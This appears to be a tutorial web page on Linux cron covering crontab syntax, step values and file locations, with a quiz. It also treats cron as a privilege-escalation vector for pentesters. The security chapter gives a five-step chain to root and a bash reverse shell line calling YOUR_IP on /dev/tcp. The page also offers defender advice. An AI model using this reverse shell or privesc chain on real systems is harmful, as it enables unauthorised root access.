cron ⏰

Linux's built-in scheduler. Runs commands automatically at times YOU define.
Admins use it for backups. Attackers use it for persistence.

"Set it and forget it — until it runs your reverse shell." 🎣
Chapter 01 // Definition

📖 What is cron?

cron is a background service (daemon) that wakes up every minute, reads a list of scheduled jobs, and runs any whose time has come.

📝 Think of it like a tiny robot with a calendar

The robot (the cron daemon) looks at its calendar (the crontab file) every 60 seconds. If it sees "at 3:00 AM, run this command" and the clock hits 3:00 AM — boom, command runs. Doesn't care if you're logged in. Doesn't care if you're asleep. Does it anyway.

The crontab file

A crontab ("cron table") is a plain-text file where each line is one scheduled job. You edit yours with:

crontab -e # edit MY crontab crontab -l # list MY crontab crontab -r # remove (nuke) MY crontab — careful
the syntax
Chapter 02 // The 5 magic numbers

🧩 Decoding a cron line

Every cron job is 5 time fields + 1 command. Left to right: minute, hour, day-of-month, month, day-of-week.

0minute
(0–59)
3hour
(0–23)
*day
(1–31)
*month
(1–12)
*weekday
(0–6)
/usr/bin/backup.sh

Translation: "At minute 0 of hour 3, every day, every month, every weekday — run backup.sh." → 3:00 AM, daily.

💡 The asterisk * means "every." Put it in any field you don't care about. * * * * * = every minute of every hour of every day. (Dangerous for heavy jobs.)

Shortcut: step values

*/12 * * * * cmd # every 12 minutes 0 */6 * * * cmd # every 6 hours on the hour 0 9 * * 1-5 cmd # 9 AM on weekdays (Mon–Fri) 0 0 1 * * cmd # midnight on the 1st of each month
🧰 Don't memorize this — use a generator. crontab.guru and cronhub.io convert English → cron syntax in seconds.
the security angle
Chapter 03 // Why pentesters LOVE cron

🥷 cron as a privilege escalation vector

Cron jobs often run as root. If you can modify what they execute, you get root. Full stop.

🚨 Classic privesc chain:
  1. Low-priv shell on a box.
  2. Read /etc/crontab — spot a script running as root every 5 minutes.
  3. Check the script's permissions with ls -l — it's chmod 777 (world-writable).
  4. Append bash -i >& /dev/tcp/YOUR_IP/4444 0>&1 to the script.
  5. Wait up to 5 minutes → receive reverse shell as root. 🎣

Where to look during enumeration

📁 /etc/crontab

System-wide crontab. Jobs here run as the user specified in the line (usually root). Readable by everyone.

📁 /etc/cron.{hourly,daily,weekly,monthly}/

Drop scripts in these folders and cron runs them at the matching interval — as root.

📁 /var/spool/cron/crontabs/

Per-user crontabs live here. Usually only root can read them all. Yours lives at /var/spool/cron/crontabs/$USER.

📁 /etc/cron.d/

Additional system jobs. Same crontab syntax. Apps drop files here during install.

Red-teamer's enumeration one-liner

# Find every cron file + print its contents (non-noisy) cat /etc/crontab /etc/cron.d/* 2>/dev/null ls -la /etc/cron.{hourly,daily,weekly,monthly}/ crontab -l 2>/dev/null
🧠 Brain Power
You find /etc/crontab contains this line:
*/5 * * * * root /home/bob/cleanup.sh
What's the FIRST thing you check?

The permissions on /home/bob/cleanup.sh with ls -l. If YOU can write to it (world-writable, or you ARE bob) → you just inherited root. Even if you can't write to the script itself, check if the directory is writable (you could rename/replace). If you can't write anywhere in the chain, check $PATH abuses — cron often runs with a limited PATH and scripts sometimes call binaries without absolute paths.

Chapter 04 // For the defenders

🛡️ How to NOT get popped via cron

  • Never set cron-executed scripts to 777 or have them in world-writable directories.
  • Use absolute paths (/usr/bin/tar) not just tar — prevents PATH-hijack attacks.
  • Run cron jobs as the least-privileged user that can do the task. Not root by default.
  • Monitor /var/log/syslog (or journalctl -u cron) — every cron execution logs.
  • Review all cron locations during audits, not just users' personal crontabs.

🎯 Quick Check

What does 0 */12 * * * cp -R /home/user/Docs /var/backups/ do?
Copies Docs to backups every 12 minutes.
Copies Docs to backups every 12 hours, on the hour.
Copies Docs to backups at noon every day.
Copies Docs to backups every December.
